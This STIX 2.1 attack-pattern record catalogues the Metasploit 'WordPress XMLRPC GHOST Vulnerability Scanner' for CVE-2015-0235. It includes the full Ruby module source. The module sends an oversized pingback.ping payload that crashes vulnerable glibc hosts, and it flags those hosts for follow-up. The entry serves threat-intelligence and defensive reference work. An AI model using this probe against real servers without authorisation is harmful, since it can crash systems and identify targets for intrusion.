{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0d47f97d-d0a0-4807-ba21-de4b13be7a1d",
    "created": "2024-08-14T16:29:50.612874Z",
    "modified": "2024-08-14T16:29:50.612877Z",
    "name": "WordPress XMLRPC GHOST Vulnerability Scanner",
    "description": " This module can be used to determine hosts vulnerable to the GHOST vulnerability via a call to the WordPress XMLRPC interface. If the target is vulnerable, the system will segfault and return a server error. On patched systems, a normal XMLRPC error is returned. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/wordpress_ghost_scanner.rb",
            "external_id": "wordpress_ghost_scanner.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-0235"
        },
        {
            "source_name": "reference",
            "url": "https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/ghost-gethostbyname-heap-overflow-in-glibc-cve-2015-0235/"
        },
        {
            "source_name": "reference",
            "url": "https://blog.sucuri.net/2015/01/critical-ghost-vulnerability-released.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HTTP::Wordpress\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(update_info(info,\n    'Name' => 'WordPress XMLRPC GHOST Vulnerability Scanner',\n    'Description' => %q{\n      This module can be used to determine hosts vulnerable to the GHOST vulnerability via\n      a call to the WordPress XMLRPC interface. If the target is vulnerable, the system\n      will segfault and return a server error. On patched systems, a normal XMLRPC error\n      is returned.\n    },\n    'Author' =>\n    [\n      'Robert Rowley',\n      'Christophe De La Fuente' ,\n      'Chaim Sanders' ,\n      'Felipe Costa' ,\n      'Jonathan Claudius' ,\n      'Karl Sigler' ,\n      'Christian Mehlmauer' # metasploit module\n    ],\n    'License' => MSF_LICENSE,\n    'References'  =>\n    [\n      [ 'CVE', '2015-0235' ],\n      [ 'URL', 'https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/ghost-gethostbyname-heap-overflow-in-glibc-cve-2015-0235/'],\n      [ 'URL', 'https://blog.sucuri.net/2015/01/critical-ghost-vulnerability-released.html']\n    ]\n    ))\n\n    register_options(\n    [\n      OptInt.new('LENGTH', [false, 'Payload length', 2500]),\n    ])\n  end\n\n  def length\n    datastore['LENGTH']\n  end\n\n  def run_host(ip)\n    unless wordpress_and_online?\n      print_error(\"Looks like this site is no WordPress blog\")\n      return\n    end\n\n    unless wordpress_xmlrpc_enabled?\n      print_error(\"XMLRPC interface is not enabled\")\n      return\n    end\n\n    ghost = \"0\" * length\n    payload = \"http://#{ghost}/#{Rex::Text.rand_text_alpha(7)}.php\"\n    xml = wordpress_generate_xml_rpc_body('pingback.ping', payload, payload)\n\n    res = send_request_cgi(\n    'uri'       => wordpress_url_xmlrpc,\n    'method'    => 'POST',\n    'ctype'     => 'text/xml;charset=UTF-8',\n    'data'      => xml\n    )\n\n    if res.nil? || res.code == 500\n      print_good(\"vulnerable to GHOST\")\n      report_vuln(\n      :host   => ip,\n      :proto  => 'tcp',\n      :port   => datastore['RPORT'],\n      :name   => self.name,\n      :info   => \"Module #{self.fullname} found GHOST vulnerability\",\n      :sname  => datastore['SSL'] ? \"https\" : \"http\"\n      )\n    else\n      print_status(\"target not vulnerable to GHOST\")\n    end\n  end\nend\n"
}